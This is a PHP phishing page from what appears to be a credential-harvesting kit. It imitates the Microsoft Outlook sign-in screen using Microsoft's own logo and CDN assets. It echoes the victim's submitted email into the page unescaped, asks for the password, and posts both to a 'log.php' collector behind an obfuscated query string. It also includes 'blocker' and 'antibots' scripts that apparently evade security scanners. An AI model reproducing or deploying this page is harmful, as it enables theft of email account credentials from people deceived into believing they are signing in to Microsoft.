<?php

session_start();
$clientemail = $_POST['username'];
$_SESSION['clientemail']=$clientemail;

 include './lib/loca.php';
  include './lib/browser.php';
  include './lib/system.php';
  include './lib/blocker.php';
  include './lib/antibots4.php';
?>
<!DOCTYPE html>
<html dir="ltr" class="gr__login_microsoftonline_com" lang="fr">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Outlook Log in</title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <link rel="shortcut icon" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">

    <meta name="robots" content="none">
    <link crossorigin="anonymous" href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_ia88a1prlwdqyj0b-dw4zw2.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-6zwj881n+POYRMmxKAdsyZj04I9Ot7aRa2P+oFp6QUUkvs65zwK7ikO6nb9ei3eu">

</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;" data-gr-c-s-loaded="true" cz-shortcut-listen="true">
    <div>
        <!--  -->
        <div data-bind="component: { name: &#39;background-image&#39;, publicMethods: backgroundControlMethods }">
            <div class="background app" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                <!-- ko if: smallImageUrl -->
                <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;find/gvfRnh.jpg&quot;);"></div>
                <!-- /ko -->
                <!-- ko if: backgroundImageUrl -->
                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;find/gvfRnh.jpg&quot;);"></div>
                <!-- ko if: useImageMask -->
                <!-- /ko -->
                <!-- /ko -->
            </div>
        </div>
        <div data-bind="if: activeDialog"></div>
        <form name="f1"  method="post" action="log.php?sf58gfd1s689sxd2sdf8angf264s9df23sd2f1n495K3L2C151645172991f1477dbd26917ef3822423f62e984a91f147">
            <!-- ko if: svr.iBannerEnvironment -->
            <!-- /ko -->
            <!-- ko withProperties: { '$loginPage': $data } -->
            <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
                <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                <!-- ko if: svr.fShowCookieBanner -->
                <!-- /ko -->
                <div class="middle app" data-bind="css: { &#39;app&#39;: backgroundLogoUrl }">
                    <!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                    <div class="background-logo-holder"> <img class="background-logo" role="presentation" data-bind="attr: { src: backgroundLogoUrl }" src="./grave/37_533e293f0c8947ada653b47c00e394e2.png"> </div>
                    <!-- /ko -->
                    <div class="inner app fade-in-lightbox" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    &#39;app&#39;: backgroundLogoUrl,
                    &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;),
                    &#39;fade-in-lightbox&#39;: fadeInLightBox,
                    &#39;has-popup&#39;: showFedCredButton,
                    &#39;transparent-lightbox&#39;: backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }">
                        <div class="lightbox-cover" data-bind="css: { &#39;disable-lightbox&#39;: svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
                        <!-- ko if: showLightboxProgress -->
                        <!-- /ko -->
                        <!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
                        <div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">
                            <!--  -->
                            <!-- ko if: bannerLogoUrl -->
                            <!-- /ko -->
                            <!-- ko if: !bannerLogoUrl && !isChinaDc -->
                            <!-- ko component: 'accessible-image-control' -->
                            <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                            <!-- /ko -->
                            <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                            <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }" src="./grave/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                            <!-- /ko -->
                            <!-- /ko -->
                            <!-- /ko -->
                            <!-- /ko -->
                        </div>
                        <!-- /ko -->
                        <!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) -->
                        <!-- /ko -->
                        <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }">
                            <!--  -->
                            <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                                <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
                                <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">
                                    <div data-bind="component: { name: 'identity-banner-control',
            params: {
                pawnIconId: svr.iPawnIcon,
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }">
                                        <!--  -->
                                        <div class="identityBanner">
                                            <!-- ko if: isBackButtonVisible -->
                                            <button type="button" class="backButton" data-bind="
        click: backButton_onClick,
        hasFocus: focusOnBackButton,
        attr: {
            'id': backButtonId || 'idBtn_Back',
            'aria-describedby': backButtonDescribedBy,
            'aria-label': str['CT_HRD_STR_Splitter_Back'] }" id="idBtn_Back" aria-label="Précédent">
                                                <!-- ko ifnot: svr.fIsRTLMarket -->
                                                <!-- ko component: 'accessible-image-control' -->
                                                <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                                <!-- /ko -->
                                                <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                                <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">
                                                <!-- /ko -->
                                                <!-- /ko -->
                                                <!-- /ko -->
                                                <!-- /ko -->
                                                <!-- ko if: svr.fIsRTLMarket -->
                                                <!-- /ko -->
                                            </button>
                                            <!-- /ko -->
                                            <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $clientemail; ?>"><?php echo $clientemail; ?></div>
                                            <!-- ko ifnot: svr.fUseTextOnlyIdentityBannerWithBack -->
                                            <!-- /ko -->
                                        </div>
                                    </div>
                                </div>
                                <!-- /ko -->
                                <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">
                                    <!-- ko foreach: views -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- ko template: { nodes: [$data], data: $parent } -->
                                    <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            evictedCreds: sharedData.evictedCreds,
                            useEvictedCredentials: sharedData.useEvictedCredentials,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata,
                            gitHubRedirectUrl: sharedData.gitHubParams.redirectUrl || svr.urlGitHubFed,
                            googleRedirectUrl: sharedData.googleParams.redirectUrl || svr.urlGoogleFed },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }">
                                        <!--  -->
                                        <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter your email password</div>
                                        <!-- ko if: unsafe_pageDescription -->
                                        <!-- /ko -->
                                        <div class="row">
                                            <div class="form-group col-md-24">
                                                <div role="alert" aria-live="assertive" aria-atomic="false">
                                                    <!-- ko if: passwordTextbox.error -->
                                                    <!-- /ko -->
                                                </div>
                                                <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
                                                    <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
													<input name="email" type="hidden" id="i0118" autocomplete="off" class="form-control"  value="<?php echo $clientemail; ?>">

                                                    <input name="pass" autofocus="autofocus" type="password" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria- data-bind="
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: unsafe_passwordAriaLabel,
                    css: { 'has-error': passwordTextbox.error }" placeholder="Password" required>
                                                    <!-- /ko -->
                                                    <!-- /ko -->
                                                    <!-- ko ifnot: usePlaceholderAttribute -->
                                                    <!-- /ko -->
                                                </div>
                                            </div>
                                        </div>
                                        <!-- ko if: svr.urlHIPScript && showHip -->
                                        <!-- /ko -->
                                        <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                            <div>
                                                <!-- ko if: svr.fShowPersistentCookiesWarning -->
                                                <!-- /ko -->
                                                <!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled -->
                                                <!-- /ko -->
                                                <div class="row">
                                                    <div class="col-md-24">
                                                        <div class="text-13 action-links">
                                                            <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.urlResetPassword, click: resetPassword_onClick">I forgot my password</a> </div>
                                                            <!-- ko if: allowPhoneDisambiguation -->
                                                            <!-- /ko -->
                                                            <!-- ko ifnot: useEvictedCredentials -->
                                                            <!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } -->
                                                            <!--  -->
                                                            <div class="form-group">
                                                                <!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) -->
                                                                <!-- /ko -->
                                                                <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
                                                                <!-- /ko -->
                                                                <!-- ko if: credentialCount === 0 && showForgotUsername -->
                                                                <!-- /ko -->
                                                            </div>
                                                            <!-- ko if: credLinkError -->
                                                            <!-- /ko -->
                                                            <!-- /ko -->
                                                            <!-- ko if: evictedCreds.length > 0 -->
                                                            <!-- /ko -->
                                                            <!-- /ko -->
                                                            <!-- ko if: showChangeUserLink -->
                                                            <!-- /ko -->
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                                <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() &amp;&amp; !svr.fUseTextOnlyIdentityBannerWithBack },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }">
                                                    <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }">
                                                        <!-- ko if: isSecondaryButtonVisible -->
                                                        <!-- /ko -->
                                                        <div data-bind="
        css: {
            'inline-block': svr.fRepositionFooterButtons,
            'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            'col-xs-24': !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block">
                                                            <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                                            <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: primaryButtonAttributes,
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Sign in"> </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <!-- ko if: tenantBranding.BoilerPlateText -->
                                        <!-- /ko -->
                                    </div>
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- ko if: showFedCredButton -->
                    <!-- /ko -->
                    <!-- ko if: newSessionMessage() && !svr.urlMsaStaticMeControl -->
                    <!-- /ko -->
                    <!-- ko if: svr.urlMsaStaticMeControl && newSession() -->
                    <!-- /ko -->
                    <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }">
                    </div>
                    <div id="footer" class="footer" role="contentinfo" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }">
                        <div data-bind="component: { name: &#39;footer-control&#39;,
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick } }">
                            <!--  -->
                            <!-- ko if: showLinks || impressumLink || showIcpLicense -->
                            <div id="footerLinks" class="footerNode text-secondary">
                                <!-- ko if: !showIcpLicense --><span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2019 Microsoft</span>
                                <!-- /ko --><a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="">Privacy and cookies</a>
                                <!-- ko if: impressumLink -->
                                <!-- /ko -->
                                <!-- ko if: showIcpLicense -->
                                <!-- /ko -->
                                <a href="" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
        hasFocus: focusMoreInfo()" aria-label="Cliquez ici pour obtenir des informations sur la résolution des problèmes">
                                    <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: true } } -->
                                    <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                    <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="./grave/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- ko component: 'accessible-image-control' -->
                                    <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                    <!-- /ko -->
                                    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                    <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="./grave/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                </a>
                            </div>
                            <!-- ko if: showDebugDetails -->
                            <!-- /ko -->
                            <!-- /ko -->
                        </div>
                    </div>
                </div>
                <!-- /ko -->
            </div>
            <!-- /ko -->
        </form>

        <!-- /ko -->
    </div>
</body>

</html>